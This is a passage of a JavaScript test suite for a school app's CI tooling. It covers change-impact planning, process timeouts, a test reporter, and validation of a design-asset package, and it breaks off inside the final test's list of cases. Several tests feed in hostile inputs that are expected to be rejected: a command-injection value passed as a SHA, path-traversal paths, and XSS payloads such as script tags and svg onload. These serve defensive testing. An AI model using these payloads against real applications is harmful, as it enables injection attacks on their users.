import assert from 'node:assert/strict'
import { createHash } from 'node:crypto'
import { deflateSync } from 'node:zlib'
import { deriveEpt95Png, designs, ept95Paths, validateEpt95Assets, validateEpt95Derivative } from './ept95-assets.mjs'
import { capturas, ept96Paths, validarPng96, validateEpt96Assets } from './ept96-assets.mjs'
import { test } from 'node:test'
import { execFileSync, spawnSync } from 'node:child_process'
import { cpSync, mkdtempSync, readFileSync, readdirSync, rmSync, mkdirSync, writeFileSync, chmodSync, symlinkSync } from 'node:fs'
import { tmpdir } from 'node:os'
import path from 'node:path'
import { changedPaths, profile, pureTests, unsupportedPackage } from './impact.mjs'
import { sqlSuites, sqlRole, dbScripts, fullScripts, supportFiles, excludedFiles, validateRegistry } from './suites.mjs'
import { families, uiFiles, validateUiRegistry, fullProjects } from './ui.mjs'
import { withCleanup } from './cleanup.mjs'
import Reporter from './reporter.mjs'
import { declaredOmission } from './omissions.mjs'
import { runBounded } from './bounded.mjs'

test('Git NUL preserves both rename paths, deletions and spaces; unknown origin blocks', () => {
  const paths = changedPaths('R100\0src/auth.ts\0docs/a b.md\0D\0old.sql\0')
  assert.deepEqual(paths, ['src/auth.ts', 'docs/a b.md', 'old.sql'])
  assert.throws(() => profile(paths), /sin contrato/u)
})
test('malformed records fail closed', () => {
  for (const raw of ['M\0a', 'R100\0a\0', 'Z\0a\0', 'M\0../a\0', 'M\0/a\0']) assert.throws(() => changedPaths(raw))
})
test('PR plans never select the full matrix, including shared auth and infrastructure', () => {
  for (const file of ['package-lock.json', '.github/workflows/ci.yml']) {
    assert.deepEqual(profile([file]), { db: true, mutations: false, ui: ['core'], prototipo: true }) // también recorre el prototipo
  }
  for (const file of ['src/proxy.ts', 'supabase/migrations/new.sql']) {
    assert.deepEqual(profile([file]), { db: true, mutations: false, ui: ['core'] })
  }
  assert.deepEqual(profile(['docs/plan.md', 'tests/tarifas-lib.spec.ts']), { db: false, mutations: false, ui: [] })
  assert.deepEqual(profile(['tests/redireccion-login.spec.ts']), { db: false, mutations: false, ui: [] })
  assert.throws(() => profile(['tests/responsive-regresion.spec.ts']), /sin contrato/u)
  assert.throws(() => profile(['package-lock.json', 'tests/responsive-regresion.spec.ts']), /sin contrato/u)
  assert.deepEqual(profile(['src/services/facturacion-job.ts']), { db: true, mutations: false, ui: [] })
  assert.deepEqual(profile(['src/app/dashboard/tarifas/page.tsx']), { db: true, mutations: false, ui: ['tarifas'] })
  for (const file of ['unknown', 'mobile/package.json', 'tests/new.spec.ts', 'src/app/api/new/route.ts']) assert.throws(() => profile([file]))
  assert.throws(() => profile(['scripts/ci/new.test.mjs']))
  assert.deepEqual(profile(['src/app/api/tarifas/route.ts', 'src/app/dashboard/cursos/page.tsx']),
    { db: true, mutations: false, ui: ['cursos', 'tarifas'] })
})
test('mobile cannot pass web-only checks', () => {
  for (const [file, deps] of [['mobile/package.json', {}], ['apps/app/package.json', { expo: '54' }], ['apps/app/package.json', { 'react-native': '0.81' }]]) {
    assert.equal(unsupportedPackage(file, { dependencies: deps }), true)
  }
  assert.equal(unsupportedPackage('packages/shared/package.json', { dependencies: { zod: '4' } }), false)
})
test('pure config and actual UI registry remain aligned, new tests block', () => {
  const config = readFileSync('playwright.pure.config.ts', 'utf8')
  for (const name of pureTests) assert.ok(config.includes(name))
  assert.ok(!config.includes('webServer'))
  validateUiRegistry(readdirSync('tests'), pureTests)
  assert.throws(() => validateUiRegistry(['new.spec.ts'], pureTests))
  for (const [family, files] of Object.entries(families)) {
    for (const file of files) {
      assert.ok(readdirSync('tests').includes(`${file}.spec.ts`))
      assert.ok(profile([`tests/${file}.spec.ts`]).ui.includes(family))
    }
    assert.ok(uiFiles([family]).length > 0)
  }
  assert.throws(() => uiFiles(['unregistered']))
  assert.equal(new Set(fullProjects).size, 17)
})
test('CLI validates SHAs and emits a bounded PR plan for initial publication', () => {
  const directory = mkdtempSync(path.join(tmpdir(), 'ept-ci-'))
  const head = execFileSync('git', ['rev-parse', 'HEAD'], { encoding: 'utf8' }).trim()
  try {
    for (const [base, db, ui] of [[head, false, []], ['0'.repeat(40), true, ['core']]]) {
      const output = path.join(directory, `plan-${db}`)
      execFileSync(process.execPath, ['scripts/ci/impact.mjs'], { env: { ...process.env,
        CI_BASE_SHA: base, CI_HEAD_SHA: head, GITHUB_OUTPUT: output } })
      assert.equal(readFileSync(output, 'utf8'), `db=${db}\nmutations=false\nui=${JSON.stringify(ui)}\nprototipo=${db}\n`)
    }
    assert.notEqual(spawnSync(process.execPath, ['scripts/ci/impact.mjs'], { env: { ...process.env, CI_HEAD_SHA: 'untrusted; command' } }).status, 0)
  } finally { rmSync(directory, { recursive: true, force: true }) }
})
test('runner refuses local execution without touching config; UI failures stop early', () => {
  const runner = readFileSync('scripts/ci/database.mjs', 'utf8')
  assert.ok(runner.includes('http://localhost:3101'))
  assert.ok(runner.includes("'--max-failures=1'"))
  assert.ok(runner.includes("'--list'"))
  const before = readFileSync('supabase/config.toml', 'utf8')
  const result = spawnSync(process.execPath, ['scripts/ci/database.mjs'], { env: { ...process.env, GITHUB_ACTIONS: 'false' }, encoding: 'utf8' })
  assert.notEqual(result.status, 0); assert.match(result.stderr, /Se exige runner GitHub/u)
  assert.equal(readFileSync('supabase/config.toml', 'utf8'), before)
})
test('every SQL/API script retains its runnable contract; mutations are explicitly selected', () => {
  const registered = [...sqlSuites, ...dbScripts, ...fullScripts, ...supportFiles, ...excludedFiles, 'tipos-generados.mjs']
  assert.deepEqual(registered.sort(), readdirSync('supabase/tests').filter(f => /\.(?:sql|mjs)$/u.test(f)).sort())
  for (const file of [...sqlSuites, ...dbScripts, ...fullScripts, ...supportFiles, 'tipos-generados.mjs']) {
    const plan = profile([`supabase/tests/${file}`]); assert.equal(plan.db, true)
    assert.equal(plan.mutations, file === 'facturacion-mutaciones.mjs')
  }
  for (const file of [...excludedFiles, 'new-suite.mjs', 'new-suite.sql']) assert.throws(() => profile([`supabase/tests/${file}`]))
  assert.throws(() => profile(['package-lock.json', 'supabase/tests/new-suite.mjs']))
  assert.throws(() => validateRegistry([...registered, 'new-suite.mjs']))
  validateRegistry(registered)
})
test('cleanup preserves original and cleanup errors, and always attempts restoration', () => {
  const original = new Error('original'), stop = new Error('stop'), restore = new Error('restore')
  let restored = false
  assert.throws(() => withCleanup(() => { throw original }, [() => { throw stop }, () => { restored = true; throw restore }]),
    error => error instanceof AggregateError && error.cause === original && error.errors[0] === original && error.errors[1] === stop && error.errors[2] === restore)
  assert.equal(restored, true)
  assert.throws(() => withCleanup(() => { throw original }, [() => {}]), error => error === original)
  assert.equal(withCleanup(() => 42, [() => {}]), 42)
})

test('timeout terminates a real parent/grandchild group before cleanup, preserving failures', () => {
  const gitRoot = process.platform === 'win32'
    ? path.resolve(execFileSync('git', ['--exec-path'], { encoding: 'utf8' }).trim(), '../../..') : ''
  const programs = process.platform === 'win32' ? { timeout: path.join(gitRoot, 'usr/bin/timeout.exe'), shell: path.join(gitRoot, 'usr/bin/bash.exe') }
    : { timeout: 'timeout', shell: 'bash' }
  const options = { encoding: 'utf8', env: { ...process.env,
    PATH: process.platform === 'win32' ? `${path.join(gitRoot, 'usr/bin')};${process.env.PATH}` : process.env.PATH } }
  const directory = mkdtempSync(path.join(tmpdir(), 'ept-ci-tree-'))
  const file = path.join(directory, 'pid')
  const posix = file.replaceAll('\\', '/').replace(/^([A-Z]):/iu, (_, drive) => `/${drive.toLowerCase()}`)
  const script = 'trap "" TERM; "$BASH" -c \'trap "" TERM; echo "$BASHPID" > "$1.child"; while :; do sleep 1; done\' child "$1" & echo "$BASHPID" > "$1.parent"; wait'
  let pids = []
  try {
    const normal = runBounded(programs.shell, ['-c', 'exit 23'], 1_000, options, programs)
    assert.equal(normal.status, 23); assert.equal(normal.timedOut, false)
    let cleaned = false
    withCleanup(() => {
      const result = runBounded(programs.shell, ['-c', script, 'fixture', posix], 1_000, options, programs)
      pids = ['parent', 'child'].map(suffix => readFileSync(`${file}.${suffix}`, 'utf8').trim())
      assert.ok(pids.every(pid => /^[1-9]\d*$/u.test(pid)))
      // MSYS devuelve SIGKILL codificado al Node Windows; el runner Linux exige 124/137.
      const killed = result.status === null && result.signal === 'SIGKILL'
      assert.ok((process.platform === 'win32' ? [2304] : [124, 137]).includes(result.status)
        || (process.platform === 'linux' && killed), `status=${result.status}; signal=${result.signal}; ${result.stderr}`)
      if (process.platform === 'linux') assert.equal(result.timedOut, true)
    }, [() => {
      for (const pid of pids) {
        const probe = process.platform === 'win32' ? 'kill -0 "$1" 2>/dev/null' : 'ps -p "$1" -o stat= | grep -q "^[^Z]"'
        const alive = spawnSync(programs.shell, ['-c', probe, 'probe', pid], options)
        assert.equal(alive.status, 1, 'Proceso propio todavía activo antes del cleanup')
      }
      assert.equal(pids.length, 2); cleaned = true
    }])
    assert.equal(cleaned, true)
  } finally {
    if (pids.length) spawnSync(programs.shell, ['-c', 'kill -KILL "$@" 2>/dev/null || true', 'cleanup', ...pids], options)
    rmSync(directory, { recursive: true, force: true })
  }
})
test('SQL owner remains correct; synchronous EPT59 SQL has server and child budgets', () => {
  assert.equal(sqlRole('inscripciones_legadas_contraccion_rls.sql'), 'postgres')
  for (const file of ['usuarios_permisos_rls.sql', 'usuarios_alta_atomica.sql']) {
    assert.equal(sqlRole(file), 'supabase_admin')
    assert.match(readFileSync(`supabase/tests/${file}`, 'utf8'), /psql -X -U supabase_admin/u)
  }
  assert.throws(() => sqlRole('new-suite.sql'))
  const helper = readFileSync('tests/usuarios-permisos-auth.spec.ts', 'utf8')
  assert.ok(helper.includes('statement_timeout=15000 -c lock_timeout=5000'))
  assert.ok(helper.includes('timeout: 20_000'))
  assert.match(readFileSync('.github/workflows/local-tests.yml', 'utf8'), /fetch-depth: 0/u)
})
test('UI report rejects setup-only, missing core/file, skips and incomplete execution', () => {
  const previous = { CI_MODE: process.env.CI_MODE, CI_UI: process.env.CI_UI, CI_LIST: process.env.CI_LIST }
  const fake = (name, file) => ({ parent: { project: () => ({ name }) }, location: { file: `/tests/${file}` }, expectedStatus: 'passed' })
  try {
    process.env.CI_MODE = 'ui'; process.env.CI_UI = '["core"]'; delete process.env.CI_LIST
    const tests = ['chromium', 'chromium-directora', 'chromium-personal', 'chromium-director-bloqueado']
      .map(name => fake(`core-${name}`, name === 'chromium' ? 'niveles-ui.spec.ts' : 'usuarios-permisos-auth.spec.ts'))
    const check = (selected, completed, status = 'passed', skipped = false) => {
      const reporter = new Reporter(); reporter.onBegin({}, { allTests: () => selected })
      for (let i = 0; i < completed; i++) reporter.onTestEnd(selected[i], { status: skipped ? 'skipped' : 'passed' })
      return reporter.onEnd({ status }).status
    }
    assert.equal(check(tests, 4), 'passed')
    assert.equal(check([fake('setup', 'auth.setup.ts')], 1), 'failed')
    assert.equal(check(tests.slice(1), 3), 'failed')
    assert.equal(check(tests, 3), 'failed'); assert.equal(check(tests, 4, 'failed'), 'failed')
    assert.equal(check(tests, 4, 'passed', true), 'failed')
    process.env.CI_UI = '["tarifas"]'; assert.equal(check(tests, 4), 'failed')
    process.env.CI_UI = '["core"]'
    tests[0].expectedStatus = 'failed'; assert.equal(check(tests, 4), 'failed') // Unexpected pass.
    const reporter = new Reporter(); reporter.onBegin({}, { allTests: () => tests })
    tests.forEach(t => reporter.onTestEnd(t, { status: t.expectedStatus }))
    assert.equal(reporter.onEnd({ status: 'passed' }).status, 'passed')
    const skipped = { ...fake('chromium', 'tarifas-ui.spec.ts'), title: 'en móvil los controles tienen alto táctil de 44 px',
      annotations: [{ type: 'skip', description: 'Solo aplica a los perfiles móviles.' }] }
    assert.ok(declaredOmission(skipped))
    assert.equal(declaredOmission({ ...skipped, title: 'new skipped feature' }), undefined)
    assert.equal(declaredOmission({ ...skipped, parent: { project: () => ({ name: 'setup' }) } }), undefined)
  } finally {
    for (const [key, value] of Object.entries(previous)) { if (value === undefined) delete process.env[key]; else process.env[key] = value }
    rmSync('ci-ui-result.json', { force: true })
  }
})

// Paquete sintético autónomo: nunca depende de los diseños reales ni del histórico bloqueado.
const BASE = 'docs/parte3/EPT-95/'
const sha256 = bytes => createHash('sha256').update(bytes).digest('hex')
const requiredRoles = ['PADRE', 'ESTUDIANTE', 'PADRE_VINCULADO_NO_CARGADOR', 'DIRECTOR', 'DOCENTE', 'PERSONAL']
const requiredStates = ['Pendiente', 'Pago parcial', 'Pagada', 'Vencida', 'Carga', 'Vacío', 'Error', 'Error incierto', 'Validación', 'Confirmación', 'Consulta propia',
  'Original no autorizado', 'Canal web', 'Sin vínculo', 'Cuenta bloqueada', 'Sesión expirada', 'Teclado', 'Texto 200%', 'En verificación', 'Datos bancarios no configurados']
const fixtureHtml = (id, escala = 1) => `<!doctype html>\n<html lang="es">\n<head>\n<meta charset="utf-8">\n<meta name="viewport" content="width=device-width, initial-scale=1">\n<title>${id} · Diseño</title>\n<link rel="stylesheet" href="../estilos.css">\n${escala > 1 ? `<style>:root { --escala: ${escala}; }</style>\n` : ''}</head>\n<body class="tema-mock">\n<div class="app"><img src="../imagenes/logo-emblema.png" alt="Logo"></div>\n</body>\n</html>\n`
const fixtureFont = () => { const b = Buffer.alloc(64); b.write('wOF2'); b.writeUInt32BE(64, 8); return b }
const fixtureSources = () => ({
  'fuentes/estilos.css': ".app { width: 100%; }\n@font-face { font-family: 'Outfit'; src: url('fuentes-tipograficas/outfit-latin-400-normal.woff2') format('woff2'); }\n",
  'fuentes/pantallas.mjs': 'export const pantallas = []\n',
  'fuentes/render.mjs': "import { pantallas } from './pantallas.mjs'\nexport const total = pantallas.length\n",
  ...Object.fromEntries(['400', '500', '600', '700'].map(w => [`fuentes/fuentes-tipograficas/outfit-latin-${w}-normal.woff2`, fixtureFont()])),
  'fuentes/fuentes-tipograficas/geist-mono-latin.woff2': fixtureFont(),
  'fuentes/fuentes-tipograficas/LICENCIA-Outfit-OFL-1.1.txt': 'SIL Open Font License 1.1\n',
  'fuentes/LICENCIAS.md': '# Licencias\n',
  'receta-render.json': JSON.stringify({ baseline: 'a'.repeat(40), renderizador: 'Playwright 1.59.1 + Chromium 147.0.7727.15 (headless)', viewport_css: [390, 844], factor_escala_dispositivo: 2,
    comandos: ['node docs/parte3/EPT-95/fuentes/render.mjs html', 'node docs/parte3/EPT-95/fuentes/render.mjs png'] }),
})
// Escribe un paquete válido, aplica cambios en disco y recalcula hashes desde disco salvo que se pida lo contrario.
function assetPackage({ files = () => {}, manifest = () => {}, refresh = true, historic = () => {} } = {}) {
  const root = mkdtempSync(path.join(tmpdir(), 'ept95-assets-'))
  const put = (file, content) => { mkdirSync(path.dirname(path.join(root, BASE + file)), { recursive: true }); writeFileSync(path.join(root, BASE + file), content) }
  const get = file => readFileSync(path.join(root, BASE + file))
  const hashOf = file => { try { return sha256(get(file)) } catch { return '0'.repeat(64) } }
  const design = fixturePng(780, 1688)
  const scaled = i => requiredStates[i % requiredStates.length] === 'Texto 200%' ? 2 : 1
  designs.forEach((d, i) => { put(d.archivo, design); put(d.fuente, fixtureHtml(d.id, scaled(i))) })
  for (const [file, content] of Object.entries(fixtureSources())) put(file, content)
  put('fuentes/imagenes/logo-emblema.png', fixturePng(320, 320))
  for (const f of ['README.md', 'estados-y-roles.md', 'matriz-cobertura.md', 'historico-stitch/recuperacion-acotada.md']) put(f, '# Diseño pasivo\n')
  put('bitacora-academica.csv', 'fecha_art,actividad,herramienta,insumo,comprension_y_adaptacion,prueba_o_limite,resultado,origen\n2026-10-09,Revisión,Render local,Fuente,Comprensión,Límite,Resultado,Asistente\n')
  // Histórico Stitch: derivados válidos con procedencia.
  const original = fixtureOriginal(true), derivation = deriveEpt95Png(original)
  const historicFiles = [...ept95Paths].filter(f => f.includes('/historico-stitch/') && f.endsWith('.png')).map(f => f.slice(BASE.length + 'historico-stitch/'.length)).sort()
  const project = 'projects/6277945596504536494'
  const historicManifest = { version: 4, tarea: 'EPT-95', estado: 'Histórico rechazado: sintético', baseline: 'a'.repeat(40), stitch_proyecto: project,
    stitch_enlace: 'https://stitch.withgoogle.com/' + project, exportacion: 'PNG derivado', ronda_correccion: 'Histórico',
    pantallas: historicFiles.map((archivo, i) => { const id = (i + 1).toString(16).padStart(32, '0'); put('historico-stitch/' + archivo, derivation.bytes)
      return { pantalla: `H${i + 1}`, area: 'historico', roles: ['PADRE'], estados: ['Normal'], requisitos: ['EPT-98/contrato-movil'], stitch_id: id, stitch_resource: `${project}/screens/${id}`,
        archivo, device_type: 'MOBILE', revision: 'Rechazado', sha256: derivation.derivedHash, pixeles: derivation.dimensions, exportado_utc: '2026-10-09T15:00:00+00:00',
        titulo_stitch: 'Ejemplo', titulo_local: 'Ejemplo', derivacion: { tipo: 'PNG derivado', original_sha256: derivation.originalHash, derivado_sha256: derivation.derivedHash,
          pixeles_rgba_sha256: derivation.pixelsHash, chunk_retirado: 'zTXt:Raw profile type APP1', verificado_utc: '2026-10-09T15:00:00+00:00' } } }) }
  historic(historicManifest)
  put('historico-stitch/manifest.json', JSON.stringify(historicManifest))
  files({ put, get, root })
  const recipe = JSON.parse(get('receta-render.json'))
  const sourcePaths = ['fuentes/estilos.css', 'fuentes/pantallas.mjs', 'fuentes/render.mjs', 'fuentes/LICENCIAS.md', 'fuentes/imagenes/logo-emblema.png', 'receta-render.json',
    ...designs.map(d => d.fuente), ...Object.keys(fixtureSources()).filter(f => f.includes('woff2') || f.endsWith('.txt'))]
  const body = {
    version: 5, tarea: 'EPT-95', estado: 'Diseños sintéticos', baseline: recipe.baseline, metodo: 'diseno-local', receta: recipe,
    fuentes: Object.fromEntries([...new Set(sourcePaths)].sort().map(f => [f, hashOf(f)])),
    datos: { referencia: '2026-10-09' },
    pantallas: designs.map((d, i) => ({ pantalla: d.id, tipo: d.tipo, area: d.area, titulo: `Diseño ${d.id}`, roles: requiredRoles, estados: [requiredStates[i % requiredStates.length]],
      requisitos: ['EPT-98/contrato-movil'], archivo: d.archivo, pixeles: [780, 1688], sha256: hashOf(d.archivo),
      origen: { tipo: 'diseno-local', fuente: d.fuente, fuente_sha256: hashOf(d.fuente), escala_texto: scaled(i) } })),
  }
  if (!refresh) body.fuentes = Object.fromEntries(Object.keys(body.fuentes).map(f => [f, 'e'.repeat(64)]))
  manifest(body)
  put('manifest.json', JSON.stringify(body))
  return { root, put, get, cleanup: () => { assert.ok(path.resolve(root).startsWith(path.resolve(tmpdir()) + path.sep)); rmSync(root, { recursive: true, force: true }) } }
}

function fixtureChunk(type, data) {
  const b = Buffer.alloc(data.length + 12); b.writeUInt32BE(data.length); b.write(type, 4); data.copy(b, 8)
  let crc = 0xffffffff
  for (const v of b.subarray(4, -4)) { crc ^= v; for (let j = 0; j < 8; j++) crc = (crc >>> 1) ^ ((crc & 1) ? 0xedb88320 : 0) }
  b.writeUInt32BE((crc ^ 0xffffffff) >>> 0, b.length - 4); return b
}
function fixturePng(width = 320, height = 320, tail = Buffer.alloc(0)) {
  const ihdr = Buffer.alloc(13); ihdr.writeUInt32BE(width); ihdr.writeUInt32BE(height, 4); ihdr[8] = 8; ihdr[9] = 2
  return Buffer.concat([Buffer.from([137,80,78,71,13,10,26,10]), fixtureChunk('IHDR', ihdr), fixtureChunk('IDAT', deflateSync(Buffer.alloc((width * 3 + 1) * height))), fixtureChunk('IEND', Buffer.alloc(0)), tail])
}
function fixtureOriginal(decorated = false) {
  const plain = fixturePng(), metadata = fixtureChunk('zTXt', Buffer.concat([Buffer.from('Raw profile type APP1\0\0'), deflateSync(Buffer.from('\ngeneric profile\n4\n49492a00\n'))]))
  return Buffer.concat([plain.subarray(0, 33), ...(decorated ? [fixtureChunk('sBIT', Buffer.from([8, 8, 8])), fixtureChunk('sRGB', Buffer.from([0]))] : []), metadata, plain.subarray(33)])
}
test('EPT-95 sanea solamente APP1 sobre copia y verifica todos los píxeles decodificados', () => {
  const original = fixtureOriginal(true), intact = Buffer.from(original), result = deriveEpt95Png(original)
  assert.deepEqual(original, intact)
  assert.equal(result.originalHash, createHash('sha256').update(intact).digest('hex'))
  // El resultado exacto conserva todos los chunks restantes, incluidos color y datos.
  const plain = fixturePng(), expected = Buffer.concat([plain.subarray(0, 33), fixtureChunk('sBIT', Buffer.from([8,8,8])), fixtureChunk('sRGB', Buffer.from([0])), plain.subarray(33)])
  assert.deepEqual(result.bytes, expected); assert.deepEqual(result.dimensions, [320, 320])
  // Digest RGBA completo después de deshacer filtros; no digest de IDAT.
  const rgba = Buffer.alloc(320 * 320 * 4); for (let i = 3; i < rgba.length; i += 4) rgba[i] = 255
  assert.equal(result.pixelsHash, createHash('sha256').update(rgba).digest('hex'))
  const provenance = { tipo: 'PNG derivado', original_sha256: result.originalHash, derivado_sha256: result.derivedHash,
    pixeles_rgba_sha256: result.pixelsHash, chunk_retirado: 'zTXt:Raw profile type APP1', verificado_utc: '2026-10-09T15:00:00+00:00' }
  validateEpt95Derivative(result.bytes, provenance)
  assert.throws(() => deriveEpt95Png(expected), e => e.code === 'E_DERIVATION_CHUNK')
  const damaged = Buffer.from(original); damaged[40] ^= 1
  assert.throws(() => deriveEpt95Png(damaged), e => e.code === 'E_PNG_CRC')
  const other = Buffer.concat([plain.subarray(0,33), fixtureChunk('zTXt', Buffer.from('otro\0\0bad')), plain.subarray(33)])
  assert.throws(() => deriveEpt95Png(other), e => e.code === 'E_ZTXT_HEADER')
  assert.throws(() => validateEpt95Derivative(original, { ...provenance, derivado_sha256: result.originalHash, original_sha256: 'a'.repeat(64) }), e => e.code === 'E_TIFF_UNVERIFIED')
  assert.throws(() => validateEpt95Derivative(result.bytes, { ...provenance, pixeles_rgba_sha256: 'a'.repeat(64) }), e => e.code === 'E_DERIVATION_PIXELS')
})

const expectCode = (root, code, label) => assert.throws(() => validateEpt95Assets(root), error => error.code === code, `${label}: se esperaba ${code}`)
test('EPT-95 acepta únicamente un paquete local completo, reproducible y móvil; sin excepciones por extensión', () => {
  const ok = assetPackage()
  try {
    const result = validateEpt95Assets(ok.root)
    assert.deepEqual(result, { disenos: 44, historicos: 33 })
    for (const file of [designs[0].archivo, designs[0].fuente, 'fuentes/estilos.css', 'fuentes/render.mjs', 'manifest.json']) {
      assert.deepEqual(profile([BASE + file], { root: ok.root }), { db: false, mutations: false, ui: [] })
    }
    for (const file of ['docs/other.png', BASE + 'new.png', BASE + 'other.json', BASE + 'fuentes/nuevo.html', 'mobile/package.json', '../docs/a.md', 'C:/docs/a.md', '\\\\server/share', 'docs\\a.md']) {
      assert.throws(() => profile([file], { root: ok.root }), undefined, file)
    }
    for (const file of ['scripts/ci/impact.mjs', 'scripts/ci/impact.test.mjs']) assert.deepEqual(profile([file]), { db: true, mutations: false, ui: ['core'], prototipo: true })
    assert.deepEqual(profile(['scripts/ci/ept95-assets.mjs']), { db: true, mutations: false, ui: ['core'] })
  } finally { ok.cleanup() }
})
test('EPT-95 valida el paquete real completo del repositorio, no solo fixtures', () => {
  assert.deepEqual(validateEpt95Assets(process.cwd()), { disenos: 44, historicos: 33 })
  assert.deepEqual(profile(['scripts/ci/ept95-assets.mjs']), { db: true, mutations: false, ui: ['core'] })
  assert.deepEqual(profile(['docs/parte3/EPT-95/manifest.json']), { db: false, mutations: false, ui: [] })
})
test('EPT-95 rechaza imágenes falsas, hashes, dimensiones y procedencia inventada con códigos específicos', () => {
  const first = designs[0]
  const cases = [
    ['FIFE disfrazado de PNG', { files: f => f.put(first.archivo, Buffer.from('<FIFE Image failed to fetch>')) }, 'E_PNG_SIGNATURE'],
    ['JPEG renombrado', { files: f => f.put(first.archivo, Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 16]), Buffer.from('JFIF\0'), Buffer.alloc(64)])) }, 'E_PNG_SIGNATURE'],
    ['PNG truncado', { files: f => f.put(first.archivo, fixturePng(780, 1688).subarray(0, -3)) }, 'E_PNG_BOUNDS'],
    ['hash incorrecto', { manifest: m => { m.pantallas[0].sha256 = 'f'.repeat(64) } }, 'E_SHA'],
    ['dimensiones falsas declaradas', { manifest: m => { m.pantallas[0].pixeles = [780, 1689] } }, 'E_DIMENSIONS'],
    ['lienzo de escritorio real', { files: f => f.put(first.archivo, fixturePng(1440, 1500)), manifest: m => { m.pantallas[0].pixeles = [1440, 1500] } }, 'E_MOBILE_CANVAS'],
    ['lienzo móvil sin factor 2', { files: f => f.put(first.archivo, fixturePng(390, 844)), manifest: m => { m.pantallas[0].pixeles = [390, 844] } }, 'E_MOBILE_CANVAS'],
    ['origen Stitch inventado', { manifest: m => { m.pantallas[0].origen.tipo = 'stitch' } }, 'E_ORIGIN'],
    ['identificador Stitch añadido', { manifest: m => { m.pantallas[0].stitch_id = 'a'.repeat(32) } }, 'E_EPT95_CONTRACT'],
    ['histórico MOBILE con lienzo de escritorio', { historic: h => { h.pantallas[0].device_type = 'DESKTOP' } }, 'E_HISTORIC'],
    ['histórico presentado como aceptado', { historic: h => { h.estado = 'Histórico aceptado por la profesora' } }, 'E_HISTORIC'],
    ['fuente editable ausente', { files: f => rmSync(path.join(f.root, BASE + first.fuente)) }, 'E_SOURCE_MISSING'],
    ['hash de fuente alterado', { manifest: m => { m.pantallas[0].origen.fuente_sha256 = 'a'.repeat(64) } }, 'E_SOURCE_HASH'],
    ['escala declarada distinta de la fuente', { manifest: m => { m.pantallas[0].origen.escala_texto = 2 } }, 'E_MANIFEST'],
    ['Texto 200 % sin escala 2', { manifest: m => { m.pantallas[0].estados = ['Texto 200%'] } }, 'E_MANIFEST'],
    ['receta con renderizador ajeno', { files: f => f.put('receta-render.json', JSON.stringify({ baseline: 'a'.repeat(40), renderizador: 'Figma 1.0', viewport_css: [390, 844], factor_escala_dispositivo: 2, comandos: ['node docs/parte3/EPT-95/fuentes/render.mjs png'] })) }, 'E_RECIPE'],
    ['hash de fuentes obsoleto', { refresh: false }, 'E_SOURCE_HASH'],
    ['recurso desconocido', { files: f => f.put('disenos/mockups/M99-extra.png', fixturePng(780, 1688)) }, 'E_UNKNOWN_RESOURCE'],
    ['directorio desconocido', { files: f => mkdirSync(path.join(f.root, BASE + 'disenos/otros')) }, 'E_UNKNOWN_RESOURCE'],
    ['falta un mockup', { files: f => rmSync(path.join(f.root, BASE + designs.find(d => d.id === 'M03').archivo)) }, 'E_PACKAGE'],
    ['área reasignada', { manifest: m => { m.pantallas[2].area = 'login' } }, 'E_MANIFEST'],
    ['sin estado Vencida', { manifest: m => { for (const s of m.pantallas) s.estados = s.estados.map(e => e === 'Vencida' ? 'Normal' : e) } }, 'E_STATES_COVERAGE'],
    ['sin actor DIRECTOR', { manifest: m => { for (const s of m.pantallas) s.roles = s.roles.filter(r => r !== 'DIRECTOR') } }, 'E_ROLES_COVERAGE'],
    ['manifest con campo extra', { manifest: m => { m.extra = 'desconocido' } }, 'E_EPT95_CONTRACT'],
    ['versión anterior de manifest', { manifest: m => { m.version = 4 } }, 'E_MANIFEST'],
    ['histórico con ID duplicado', { historic: h => { h.pantallas[1].stitch_id = h.pantallas[0].stitch_id; h.pantallas[1].stitch_resource = h.pantallas[0].stitch_resource } }, 'E_STITCH_ID'],
    ['histórico con hash alterado', { historic: h => { h.pantallas[0].sha256 = 'f'.repeat(64) } }, 'E_SHA'],
  ]
  for (const [label, options, code] of cases) {
    const p = assetPackage(options)
    try { expectCode(p.root, code, label); assert.throws(() => profile([BASE + 'manifest.json'], { root: p.root }), undefined, label) } finally { p.cleanup() }
  }
})
test('EPT-95 trata HTML, CSS y módulos de render como contenido activo con análisis propio', () => {
  const html = designs[3].fuente
  const base = fixtureHtml(designs[3].id)
  const cases = [
    ['script embebido', f => f.put(html, base.replace('<body class="tema-mock">', '<body class="tema-mock"><script>alert(1)</script>')), 'E_ACTIVE_HTML'],
    ['recurso remoto', f => f.put(html, base.replace('</body>', '<img src="https://example.test/a.png"></body>')), 'E_ACTIVE_HTML'],
    ['manejador de evento', f => f.put(html, base.replace('class="app"', 'class="app" onclick="x()"')), 'E_ACTIVE_HTML'],
    ['hoja de estilos remota', f => f.put(html, base.replace('../estilos.css', 'estilos-externos.css')), 'E_ACTIVE_HTML'],
    ['imagen no registrada', f => f.put(html, base.replace('../imagenes/logo-emblema.png', '../imagenes/otra.png')), 'E_ACTIVE_HTML'],
    ['iframe', f => f.put(html, base.replace('</body>', '<iframe src="../estilos.css"></iframe></body>')), 'E_ACTIVE_HTML'],
    ['style embebido ajeno', f => f.put(html, base.replace('</head>', '<style>body { background: red; }</style>\n</head>')), 'E_ACTIVE_HTML'],
    ['CSS con importación', f => f.put('fuentes/estilos.css', "@import url('https://example.test/x.css');\n"), 'E_ACTIVE_CSS'],
    ['CSS con url local no registrada', f => f.put('fuentes/estilos.css', "body { background: url('fondo.png'); }\n"), 'E_ACTIVE_CSS'],
    ['CSS con importación escapada', f => f.put('fuentes/estilos.css', '@\\69mport "otro.css";\n'), 'E_ACTIVE_CSS'],
    ['CSS con image-set', f => f.put('fuentes/estilos.css', "body { background: image-set('a.png' 1x); }\n"), 'E_ACTIVE_CSS'],
    ['CSS con fuente inventada', f => f.put('fuentes/estilos.css', "@font-face { src: url('fuentes-tipograficas/inventada.woff2'); }\n"), 'E_ACTIVE_CSS'],
    ['HTML con evento sin espacio', f => f.put(html, base.replace('class="app"', 'class="app"onclick="x()"')), 'E_ACTIVE_HTML'],
    ['HTML con svg onload', f => f.put(html, base.replace('</body>', '<svg/onload=alert(1)></body>')), 'E_ACTIVE_HTML'],
    ['HTML con atributo entre comillas simples', f => f.put(html, base.replace('class="app"', "class='app'")), 'E_ACTIVE_HTML'],
    ['HTML con entidad numérica', f => f.put(html, base.replace('</body>', '<p>&#106;avascript</p></body>')), 'E_ACTIVE_HTML'],
